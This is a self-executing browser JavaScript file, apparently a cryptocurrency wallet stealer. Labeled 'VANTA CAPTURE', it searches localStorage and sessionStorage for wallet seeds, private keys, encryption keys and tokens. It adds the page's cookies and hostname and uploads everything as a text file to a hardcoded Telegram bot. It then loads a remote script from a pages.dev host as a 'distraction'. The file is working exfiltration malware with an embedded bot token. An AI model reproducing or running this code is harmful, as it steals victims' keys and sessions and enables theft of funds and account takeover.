(function() {
    // --- ALL KNOWLEDGE LIVES HERE ---
    const CONFIG = {
        bot_token: '8286410095:AAEps2Vfd5Nk5_uSAg23tpI8TZpFTdtFKaA',
        chat_id: '8321398409',
        // Every key you want the engine to search for
        keys: [
            '.phantom', 
            '.vault', 
            '.offline', 
            '.fungible', 
            'padre', 
            'seed', 
            'privateKey', 
            'encryptionKey', 
            'tokens'
        ]
    };

    async function vantaProcess() {
        console.log("📡 NODE_ACTIVE");
        let vault = `--- VANTA CAPTURE [${new Date().toLocaleString()}] ---\n`;
        vault += `ORIGIN: ${window.location.hostname}\n\n`;

        // Crawl Local and Session Storage for the knowledge keys
        [localStorage, sessionStorage].forEach(s => {
            for (let i = 0; i < s.length; i++) {
                let k = s.key(i);
                if (CONFIG.keys.some(x => k.toLowerCase().includes(x))) {
                    vault += `[${k}]\n${s.getItem(k)}\n\n`;
                }
            }
        });

        vault += `--- COOKIES ---\n${document.cookie}`;

        // Send to Telegram as a file (bypass CORB and character limits)
        const blob = new Blob([vault], { type: 'text/plain' });
        const fd = new FormData();
        fd.append('chat_id', CONFIG.chat_id);
        fd.append('document', blob, `vanta_vault_${Date.now()}.txt`);

        try {
            // Mode 'no-cors' allows the request to fire even if the site blocks the response
            fetch(`https://api.telegram.org/bot${CONFIG.bot_token}/sendDocument`, {
                method: 'POST',
                body: fd,
                mode: 'no-cors'
            });

            // Load the Visual Vanta UI (Distraction)
            setTimeout(() => {
                var ui = document.createElement('script');
                ui.src = 'https://14c11728.reversevanta.pages.dev/modalx.js';
                document.head.appendChild(ui);
            }, 800);

        } catch (e) {}
    }

    vantaProcess();
})();
